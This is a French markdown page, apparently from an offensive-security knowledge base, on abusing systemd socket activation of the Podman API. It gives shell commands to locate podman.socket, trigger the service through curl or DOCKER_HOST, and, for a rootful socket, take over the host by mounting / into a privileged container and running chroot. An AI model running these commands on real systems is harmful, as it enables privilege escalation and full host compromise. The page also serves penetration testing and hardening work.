---
title: "Activation par socket systemd : exposition à la demande de l'API Podman"
description: "Le service API de Podman est couramment démarré à la demande via l'activation par socket systemd : systemd détient le socket en écoute et lance Podman à la première connexion. Un attaquant capable d'atteindre le socket d'activation, une unité podman.socket utilisateur ou système, déclenche le service et obtient la même API de contrôle des conteneurs, avec une exposition qui dépend de la portée utilisateur ou root du socket."
keywords:
  - activation par socket systemd
  - podman.socket
  - api podman
  - service à la demande
  - contrôle de conteneur
---

# Activation par socket systemd

Plutôt que d'exécuter le service API de Podman en continu, les systèmes activent généralement `podman.socket`, une unité socket systemd. systemd détient le socket en écoute et démarre `podman system service` uniquement lorsqu'un client se connecte, puis lui transmet la connexion acceptée. Pour un attaquant, c'est transparent : atteindre le socket d'activation déclenche le service et produit l'API compatible Docker. Ce qui compte, c'est la portée du socket, un `podman.socket` utilisateur sous `/run/user/<uid>/` ou un socket système sous `/run/`, qui décide si le service résultant est rootless ou rootful.

Localisez le socket d'activation et sa portée :

```bash
systemctl status podman.socket 2>/dev/null
systemctl --user status podman.socket 2>/dev/null
ls -l /run/podman/podman.sock /run/user/*/podman/podman.sock 2>/dev/null
# a connection activates the service; confirm by calling it
curl -s --unix-socket /run/podman/podman.sock http://d/version
```

## Le déclencher et l'utiliser

```bash
# the first request activates podman system service behind the socket
export DOCKER_HOST=unix:///run/podman/podman.sock
docker info                                           # service now running
# if system-scoped (rootful), proceed to host takeover
docker run -v /:/host --privileged --rm -it alpine chroot /host sh
```

## Notes d'exploitation

- L'activation par socket signifie que le service peut sembler absent (aucun processus en cours) tout en étant pleinement joignable ; ne concluez pas que l'API est indisponible à partir de l'absence d'un processus `podman system service`, testez le socket.
- La portée est déterminante : un `podman.socket` système active un service rootful et constitue un chemin de prise de contrôle de l'hôte ; un socket utilisateur est borné par le [modèle rootless](rootless-model.md).
- Atteindre un socket utilisateur nécessite un accès en tant que cet utilisateur (ou à son `/run/user/<uid>`), ce qu'un point d'appui préalable en tant que cet utilisateur fournit ; le socket système est protégé par ses permissions de système de fichiers.

## Références

- [Podman: socket activation](https://docs.podman.io/en/latest/markdown/podman-systemd.unit.5.html)
- [systemd.socket](https://www.freedesktop.org/software/systemd/man/systemd.socket.html)
